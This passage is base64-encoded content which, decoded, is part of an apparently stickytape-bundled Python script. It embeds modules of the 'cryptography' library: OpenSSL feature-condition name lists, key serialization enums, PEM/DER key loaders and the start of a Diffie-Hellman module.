lNTTF9zZXRfdGxzZXh0X3VzZV9zcnRwIixcclxuICAgICAgICAiU1NMX2dldF9zZWxlY3RlZF9zcnRwX3Byb2ZpbGUiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX2dldF9wcm90b192ZXJzaW9uKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNTTF9DVFhfZ2V0X21pbl9wcm90b192ZXJzaW9uIixcclxuICAgICAgICAiU1NMX0NUWF9nZXRfbWF4X3Byb3RvX3ZlcnNpb24iLFxyXG4gICAgICAgICJTU0xfZ2V0X21pbl9wcm90b192ZXJzaW9uIixcclxuICAgICAgICAiU1NMX2dldF9tYXhfcHJvdG9fdmVyc2lvbiIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfcHJvdmlkZXJzKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIk9TU0xfUFJPVklERVJfbG9hZCIsXHJcbiAgICAgICAgIk9TU0xfUFJPVklERVJfdW5sb2FkIixcclxuICAgICAgICAiRVJSX0xJQl9QUk9WIixcclxuICAgICAgICAiUFJPVl9SX1dST05HX0ZJTkFMX0JMT0NLX0xFTkdUSCIsXHJcbiAgICAgICAgIlBST1ZfUl9CQURfREVDUllQVCIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfb3Bfbm9fcmVuZWdvdGlhdGlvbigpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJTU0xfT1BfTk9fUkVORUdPVElBVElPTiIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfZHRsc19nZXRfZGF0YV9tdHUoKSAtPiB0eXBpbmcuTGlzdFtzdHJdOlxyXG4gICAgcmV0dXJuIFtcclxuICAgICAgICAiRFRMU19nZXRfZGF0YV9tdHUiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzXzMwMF9maXBzKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIkVWUF9kZWZhdWx0X3Byb3BlcnRpZXNfaXNfZmlwc19lbmFibGVkIixcclxuICAgICAgICAiRVZQX2RlZmF1bHRfcHJvcGVydGllc19lbmFibGVfZmlwcyIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfc3NsX2Nvb2tpZSgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJTU0xfT1BfQ09PS0lFX0VYQ0hBTkdFIixcclxuICAgICAgICAiRFRMU3YxX2xpc3RlbiIsXHJcbiAgICAgICAgIlNTTF9DVFhfc2V0X2Nvb2tpZV9nZW5lcmF0ZV9jYiIsXHJcbiAgICAgICAgIlNTTF9DVFhfc2V0X2Nvb2tpZV92ZXJpZnlfY2IiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX3BrY3M3X2Z1bmNzKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNNSU1FX3dyaXRlX1BLQ1M3IixcclxuICAgICAgICAiUEVNX3dyaXRlX2Jpb19QS0NTN19zdHJlYW0iLFxyXG4gICAgICAgICJQS0NTN19zaWduX2FkZF9zaWduZXIiLFxyXG4gICAgICAgICJQS0NTN19maW5hbCIsXHJcbiAgICAgICAgIlBLQ1M3X3ZlcmlmeSIsXHJcbiAgICAgICAgIlNNSU1FX3JlYWRfUEtDUzciLFxyXG4gICAgICAgICJQS0NTN19nZXQwX3NpZ25lcnMiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX2JuX2ZsYWdzKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIkJOX0ZMR19DT05TVFRJTUUiLFxyXG4gICAgICAgICJCTl9zZXRfZmxhZ3MiLFxyXG4gICAgICAgICJCTl9wcmltZV9jaGVja3NfZm9yX3NpemUiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX2V2cF9wa2V5X2RoKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIkVWUF9QS0VZX3NldDFfREgiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzXzMwMF9ldnBfY2lwaGVyKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbIkVWUF9DSVBIRVJfZmV0Y2giLCAiRVZQX0NJUEhFUl9mcmVlIl1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc191bmV4cGVjdGVkX2VvZl93aGlsZV9yZWFkaW5nKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbIlNTTF9SX1VORVhQRUNURURfRU9GX1dISUxFX1JFQURJTkciXVxyXG5cclxuXHJcbiMgVGhpcyBpcyBhIG1hcHBpbmcgb2ZcclxuIyB7Y29uZGl0aW9uOiBmdW5jdGlvbi1yZXR1cm5pbmctbmFtZXMtZGVwZW5kZW50LW9uLXRoYXQtY29uZGl0aW9ufSBzbyB3ZSBjYW5cclxuIyBsb29wIG92ZXIgdGhlbSBhbmQgZGVsZXRlIHVuc3VwcG9ydGVkIG5hbWVzIGF0IHJ1bnRpbWUuIEl0IHdpbGwgYmUgcmVtb3ZlZFxyXG4jIHdoZW4gY2ZmaSBzdXBwb3J0cyAjaWYgaW4gY2RlZi4gV2UgdXNlIGZ1bmN0aW9ucyBpbnN0ZWFkIG9mIGp1c3QgYSBkaWN0IG9mXHJcbiMgbGlzdHMgc28gd2UgY2FuIHVzZSBjb3ZlcmFnZSB0byBtZWFzdXJlIHdoaWNoIGFyZSB1c2VkLlxyXG5DT05ESVRJT05BTF9OQU1FUyA9IHtcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTX0VDMk0iOiBjcnlwdG9ncmFwaHlfaGFzX2VjMm0sXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19TU0wzX01FVEhPRCI6IGNyeXB0b2dyYXBoeV9oYXNfc3NsM19tZXRob2QsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU18xMTBfVkVSSUZJQ0FUSU9OX1BBUkFNUyI6IChcclxuICAgICAgICBjcnlwdG9ncmFwaHlfaGFzXzExMF92ZXJpZmljYXRpb25fcGFyYW1zXHJcbiAgICApLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfU0VUX0NFUlRfQ0IiOiBjcnlwdG9ncmFwaHlfaGFzX3NldF9jZXJ0X2NiLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfU1NMX1NUIjogY3J5cHRvZ3JhcGh5X2hhc19zc2xfc3QsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19UTFNfU1QiOiBjcnlwdG9ncmFwaHlfaGFzX3Rsc19zdCxcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTX1NDUllQVCI6IGNyeXB0b2dyYXBoeV9oYXNfc2NyeXB0LFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfRVZQX1BLRVlfREhYIjogY3J5cHRvZ3JhcGh5X2hhc19ldnBfcGtleV9kaHgsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19NRU1fRlVOQ1RJT05TIjogY3J5cHRvZ3JhcGh5X2hhc19tZW1fZnVuY3Rpb25zLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfWDUwOV9TVE9SRV9DVFhfR0VUX0lTU1VFUiI6IChcclxuICAgICAgICBjcnlwdG9ncmFwaHlfaGFzX3g1MDlfc3RvcmVfY3R4X2dldF9pc3N1ZXJcclxuICAgICksXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19FRDQ0OCI6IGNyeXB0b2dyYXBoeV9oYXNfZWQ0NDgsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19FRDI1NTE5IjogY3J5cHRvZ3JhcGh5X2hhc19lZDI1NTE5LFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfUE9MWTEzMDUiOiBjcnlwdG9ncmFwaHlfaGFzX3BvbHkxMzA1LFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfT05FU0hPVF9FVlBfRElHRVNUX1NJR05fVkVSSUZZIjogKFxyXG4gICAgICAgIGNyeXB0b2dyYXBoeV9oYXNfb25lc2hvdF9ldnBfZGlnZXN0X3NpZ25fdmVyaWZ5XHJcbiAgICApLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfRVZQX1BLRVlfZ2V0X3NldF90bHNfZW5jb2RlZHBvaW50IjogKFxyXG4gICAgICAgIGNyeXB0b2dyYXBoeV9oYXNfZXZwX3BrZXlfZ2V0X3NldF90bHNfZW5jb2RlZHBvaW50XHJcbiAgICApLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfRklQUyI6IGNyeXB0b2dyYXBoeV9oYXNfZmlwcyxcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTX1BTSyI6IGNyeXB0b2dyYXBoeV9oYXNfcHNrLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfUFNLX1RMU3YxXzMiOiBjcnlwdG9ncmFwaHlfaGFzX3Bza190bHN2MTMsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19DVVNUT01fRVhUIjogY3J5cHRvZ3JhcGh5X2hhc19jdXN0b21fZXh0LFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfT1BFTlNTTF9DTEVBTlVQIjogY3J5cHRvZ3JhcGh5X2hhc19vcGVuc3NsX2NsZWFudXAsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19UTFN2MV8zIjogY3J5cHRvZ3JhcGh5X2hhc190bHN2MTMsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19UTFN2MV8zX0ZVTkNUSU9OUyI6IGNyeXB0b2dyYXBoeV9oYXNfdGxzdjEzX2Z1bmN0aW9ucyxcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTX0tFWUxPRyI6IGNyeXB0b2dyYXBoeV9oYXNfa2V5bG9nLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfUkFXX0tFWSI6IGNyeXB0b2dyYXBoeV9oYXNfcmF3X2tleSxcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTX0VWUF9ESUdFU1RGSU5BTF9YT0YiOiAoXHJcbiAgICAgICAgY3J5cHRvZ3JhcGh5X2hhc19ldnBfZGlnZXN0ZmluYWxfeG9mXHJcbiAgICApLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfRU5HSU5FIjogY3J5cHRvZ3JhcGh5X2hhc19lbmdpbmUsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19WRVJJRklFRF9DSEFJTiI6IGNyeXB0b2dyYXBoeV9oYXNfdmVyaWZpZWRfY2hhaW4sXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19TUlRQIjogY3J5cHRvZ3JhcGh5X2hhc19zcnRwLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfR0VUX1BST1RPX1ZFUlNJT04iOiBjcnlwdG9ncmFwaHlfaGFzX2dldF9wcm90b192ZXJzaW9uLFxyXG4gICAgIkNyeXB0b2dyYXBoeV9IQVNfUFJPVklERVJTIjogY3J5cHRvZ3JhcGh5X2hhc19wcm92aWRlcnMsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19PUF9OT19SRU5FR09USUFUSU9OIjogKFxyXG4gICAgICAgIGNyeXB0b2dyYXBoeV9oYXNfb3Bfbm9fcmVuZWdvdGlhdGlvblxyXG4gICAgKSxcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTX0RUTFNfR0VUX0RBVEFfTVRVIjogY3J5cHRvZ3JhcGh5X2hhc19kdGxzX2dldF9kYXRhX210dSxcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTXzMwMF9GSVBTIjogY3J5cHRvZ3JhcGh5X2hhc18zMDBfZmlwcyxcclxuICAgICJDcnlwdG9ncmFwaHlfSEFTX1NTTF9DT09LSUUiOiBjcnlwdG9ncmFwaHlfaGFzX3NzbF9jb29raWUsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19QS0NTN19GVU5DUyI6IGNyeXB0b2dyYXBoeV9oYXNfcGtjczdfZnVuY3MsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19CTl9GTEFHUyI6IGNyeXB0b2dyYXBoeV9oYXNfYm5fZmxhZ3MsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19FVlBfUEtFWV9ESCI6IGNyeXB0b2dyYXBoeV9oYXNfZXZwX3BrZXlfZGgsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU18zMDBfRVZQX0NJUEhFUiI6IGNyeXB0b2dyYXBoeV9oYXNfMzAwX2V2cF9jaXBoZXIsXHJcbiAgICAiQ3J5cHRvZ3JhcGh5X0hBU19VTkVYUEVDVEVEX0VPRl9XSElMRV9SRUFESU5HIjogKFxyXG4gICAgICAgIGNyeXB0b2dyYXBoeV9oYXNfdW5leHBlY3RlZF9lb2Zfd2hpbGVfcmVhZGluZ1xyXG4gICAgKSxcclxufVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL3NlcmlhbGl6YXRpb24vX19pbml0X18ucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuX3NlcmlhbGl6YXRpb24gaW1wb3J0IChcclxuICAgIEJlc3RBdmFpbGFibGVFbmNyeXB0aW9uLFxyXG4gICAgRW5jb2RpbmcsXHJcbiAgICBLZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbixcclxuICAgIE5vRW5jcnlwdGlvbixcclxuICAgIFBhcmFtZXRlckZvcm1hdCxcclxuICAgIFByaXZhdGVGb3JtYXQsXHJcbiAgICBQdWJsaWNGb3JtYXQsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuc2VyaWFsaXphdGlvbi5iYXNlIGltcG9ydCAoXHJcbiAgICBsb2FkX2Rlcl9wYXJhbWV0ZXJzLFxyXG4gICAgbG9hZF9kZXJfcHJpdmF0ZV9rZXksXHJcbiAgICBsb2FkX2Rlcl9wdWJsaWNfa2V5LFxyXG4gICAgbG9hZF9wZW1fcGFyYW1ldGVycyxcclxuICAgIGxvYWRfcGVtX3ByaXZhdGVfa2V5LFxyXG4gICAgbG9hZF9wZW1fcHVibGljX2tleSxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5zZXJpYWxpemF0aW9uLnNzaCBpbXBvcnQgKFxyXG4gICAgbG9hZF9zc2hfcHJpdmF0ZV9rZXksXHJcbiAgICBsb2FkX3NzaF9wdWJsaWNfa2V5LFxyXG4pXHJcblxyXG5cclxuX19hbGxfXyA9IFtcclxuICAgICJsb2FkX2Rlcl9wYXJhbWV0ZXJzIixcclxuICAgICJsb2FkX2Rlcl9wcml2YXRlX2tleSIsXHJcbiAgICAibG9hZF9kZXJfcHVibGljX2tleSIsXHJcbiAgICAibG9hZF9wZW1fcGFyYW1ldGVycyIsXHJcbiAgICAibG9hZF9wZW1fcHJpdmF0ZV9rZXkiLFxyXG4gICAgImxvYWRfcGVtX3B1YmxpY19rZXkiLFxyXG4gICAgImxvYWRfc3NoX3ByaXZhdGVfa2V5IixcclxuICAgICJsb2FkX3NzaF9wdWJsaWNfa2V5IixcclxuICAgICJFbmNvZGluZyIsXHJcbiAgICAiUHJpdmF0ZUZvcm1hdCIsXHJcbiAgICAiUHVibGljRm9ybWF0IixcclxuICAgICJQYXJhbWV0ZXJGb3JtYXQiLFxyXG4gICAgIktleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uIixcclxuICAgICJCZXN0QXZhaWxhYmxlRW5jcnlwdGlvbiIsXHJcbiAgICAiTm9FbmNyeXB0aW9uIixcclxuXVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL19zZXJpYWxpemF0aW9uLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IGFiY1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcblxyXG4jIFRoaXMgZXhpc3RzIHRvIGJyZWFrIGFuIGltcG9ydCBjeWNsZS4gVGhlc2UgY2xhc3NlcyBhcmUgbm9ybWFsbHkgYWNjZXNzaWJsZVxyXG4jIGZyb20gdGhlIHNlcmlhbGl6YXRpb24gbW9kdWxlLlxyXG5cclxuXHJcbmNsYXNzIEVuY29kaW5nKHV0aWxzLkVudW0pOlxyXG4gICAgUEVNID0gIlBFTSJcclxuICAgIERFUiA9ICJERVIiXHJcbiAgICBPcGVuU1NIID0gIk9wZW5TU0giXHJcbiAgICBSYXcgPSAiUmF3IlxyXG4gICAgWDk2MiA9ICJBTlNJIFg5LjYyIlxyXG4gICAgU01JTUUgPSAiUy9NSU1FIlxyXG5cclxuXHJcbmNsYXNzIFByaXZhdGVGb3JtYXQodXRpbHMuRW51bSk6XHJcbiAgICBQS0NTOCA9ICJQS0NTOCJcclxuICAgIFRyYWRpdGlvbmFsT3BlblNTTCA9ICJUcmFkaXRpb25hbE9wZW5TU0wiXHJcbiAgICBSYXcgPSAiUmF3IlxyXG4gICAgT3BlblNTSCA9ICJPcGVuU1NIIlxyXG5cclxuXHJcbmNsYXNzIFB1YmxpY0Zvcm1hdCh1dGlscy5FbnVtKTpcclxuICAgIFN1YmplY3RQdWJsaWNLZXlJbmZvID0gIlguNTA5IHN1YmplY3RQdWJsaWNLZXlJbmZvIHdpdGggUEtDUyMxIlxyXG4gICAgUEtDUzEgPSAiUmF3IFBLQ1MjMSJcclxuICAgIE9wZW5TU0ggPSAiT3BlblNTSCJcclxuICAgIFJhdyA9ICJSYXciXHJcbiAgICBDb21wcmVzc2VkUG9pbnQgPSAiWDkuNjIgQ29tcHJlc3NlZCBQb2ludCJcclxuICAgIFVuY29tcHJlc3NlZFBvaW50ID0gIlg5LjYyIFVuY29tcHJlc3NlZCBQb2ludCJcclxuXHJcblxyXG5jbGFzcyBQYXJhbWV0ZXJGb3JtYXQodXRpbHMuRW51bSk6XHJcbiAgICBQS0NTMyA9ICJQS0NTMyJcclxuXHJcblxyXG5jbGFzcyBLZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbihtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIEJlc3RBdmFpbGFibGVFbmNyeXB0aW9uKEtleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwYXNzd29yZDogYnl0ZXMpOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHBhc3N3b3JkLCBieXRlcykgb3IgbGVuKHBhc3N3b3JkKSA9PSAwOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJQYXNzd29yZCBtdXN0IGJlIDEgb3IgbW9yZSBieXRlcy4iKVxyXG5cclxuICAgICAgICBzZWxmLnBhc3N3b3JkID0gcGFzc3dvcmRcclxuXHJcblxyXG5jbGFzcyBOb0VuY3J5cHRpb24oS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24pOlxyXG4gICAgcGFzc1xyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL3NlcmlhbGl6YXRpb24vYmFzZS5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljIGltcG9ydCBkaFxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLnR5cGVzIGltcG9ydCAoXHJcbiAgICBQUklWQVRFX0tFWV9UWVBFUyxcclxuICAgIFBVQkxJQ19LRVlfVFlQRVMsXHJcbilcclxuXHJcblxyXG5kZWYgbG9hZF9wZW1fcHJpdmF0ZV9rZXkoXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIHBhc3N3b3JkOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbikgLT4gUFJJVkFURV9LRVlfVFlQRVM6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kIGFzIG9zc2xcclxuXHJcbiAgICByZXR1cm4gb3NzbC5sb2FkX3BlbV9wcml2YXRlX2tleShkYXRhLCBwYXNzd29yZClcclxuXHJcblxyXG5kZWYgbG9hZF9wZW1fcHVibGljX2tleShcclxuICAgIGRhdGE6IGJ5dGVzLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZVxyXG4pIC0+IFBVQkxJQ19LRVlfVFlQRVM6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kIGFzIG9zc2xcclxuXHJcbiAgICByZXR1cm4gb3NzbC5sb2FkX3BlbV9wdWJsaWNfa2V5KGRhdGEpXHJcblxyXG5cclxuZGVmIGxvYWRfcGVtX3BhcmFtZXRlcnMoXHJcbiAgICBkYXRhOiBieXRlcywgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmVcclxuKSAtPiAiZGguREhQYXJhbWV0ZXJzIjpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmQgYXMgb3NzbFxyXG5cclxuICAgIHJldHVybiBvc3NsLmxvYWRfcGVtX3BhcmFtZXRlcnMoZGF0YSlcclxuXHJcblxyXG5kZWYgbG9hZF9kZXJfcHJpdmF0ZV9rZXkoXHJcbiAgICBkYXRhOiBieXRlcyxcclxuICAgIHBhc3N3b3JkOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbikgLT4gUFJJVkFURV9LRVlfVFlQRVM6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kIGFzIG9zc2xcclxuXHJcbiAgICByZXR1cm4gb3NzbC5sb2FkX2Rlcl9wcml2YXRlX2tleShkYXRhLCBwYXNzd29yZClcclxuXHJcblxyXG5kZWYgbG9hZF9kZXJfcHVibGljX2tleShcclxuICAgIGRhdGE6IGJ5dGVzLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZVxyXG4pIC0+IFBVQkxJQ19LRVlfVFlQRVM6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kIGFzIG9zc2xcclxuXHJcbiAgICByZXR1cm4gb3NzbC5sb2FkX2Rlcl9wdWJsaWNfa2V5KGRhdGEpXHJcblxyXG5cclxuZGVmIGxvYWRfZGVyX3BhcmFtZXRlcnMoXHJcbiAgICBkYXRhOiBieXRlcywgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmVcclxuKSAtPiAiZGguREhQYXJhbWV0ZXJzIjpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IGJhY2tlbmQgYXMgb3NzbFxyXG5cclxuICAgIHJldHVybiBvc3NsLmxvYWRfZGVyX3BhcmFtZXRlcnMoZGF0YSlcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9hc3ltbWV0cmljL19faW5pdF9fLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL2FzeW1tZXRyaWMvZGgucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgX3NlcmlhbGl6YXRpb25cclxuXHJcblxyXG5fTUlOX01PRFVMVVNfU0laRSA9IDUxMlxyXG5cclxuXHJcbmRlZiBnZW5lcmF0ZV9wYXJhbWV0ZXJzKFxyXG4gICAgZ2VuZXJhdG9yOiBpbnQsIGtleV9zaXplOiBpbnQsIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lXHJcbikgLT4gIkRIUGFyYW1ldGVycyI6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kIGFzIG9zc2xcclxuXHJcbiAgICByZXR1cm4gb3NzbC5nZW5lcmF0ZV9kaF9wYXJhbWV0ZXJzKGdlbmVyYXRvciwga2V5X3NpemUpXHJcblxyXG5cclxuY2xhc3MgREhQYXJhbWV0ZXJOdW1iZXJzOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHA6IGludCwgZzogaW50LCBxOiB0eXBpbmcuT3B0aW9uYWxbaW50XSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocCwgaW50KSBvciBub3QgaXNpbnN0YW5jZShnLCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInAgYW5kIGcgbXVzdCBiZSBpbnRlZ2VycyIpXHJcbiAgICAgICAgaWYgcSBpcyBub3QgTm9uZSBhbmQgbm90IGlzaW5zdGFuY2UocSwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJxIG11c3QgYmUgaW50ZWdlciBvciBOb25lIilcclxuXH